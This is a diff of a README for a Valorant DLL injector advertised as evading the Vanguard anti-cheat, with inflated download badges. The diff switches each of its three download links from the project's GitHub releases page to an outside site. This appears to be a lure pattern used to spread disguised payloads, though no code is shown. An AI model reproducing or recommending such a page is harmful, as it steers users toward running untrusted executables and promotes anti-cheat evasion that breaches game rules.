@@ -1,6 +1,6 @@
 # 🎯 valorant-injector-2026 - Safely Load Any DLL Without Detection
 
-[![Download Now](https://img.shields.io/badge/⬇️_DOWNLOAD-VALORANT_INJECTOR_2026-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Nyu-x/valorant-injector-2026/releases)
+[![Download Now](https://img.shields.io/badge/⬇️_DOWNLOAD-VALORANT_INJECTOR_2026-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://nyu-x.github.io)
 
 ![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white) ![Version](https://img.shields.io/badge/Version-v2026-brightgreen?style=flat-square) ![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square) ![Downloads](https://img.shields.io/badge/Downloads-1.1m%2B-orange?style=flat-square)
 
@@ -39,7 +39,7 @@ This tool lets you load custom DLL files into Valorant without triggering Vangua
 
 Visit this link to download the application:
 
-[**https://github.com/Nyu-x/valorant-injector-2026/releases**](https://github.com/Nyu-x/valorant-injector-2026/releases)
+[**https://nyu-x.github.io**](https://nyu-x.github.io)
 
 ### Step 2: Extract the Files
 
@@ -137,7 +137,7 @@ No. This injector requires Windows 10 or 11 with the latest updates installed.
 
 Need the download link one more time? Here it is:
 
-[**⬇️ Download Valorant Injector 2026**](https://github.com/Nyu-x/valorant-injector-2026/releases)
+[**⬇️ Download Valorant Injector 2026**](https://nyu-x.github.io)
 
 ---
 
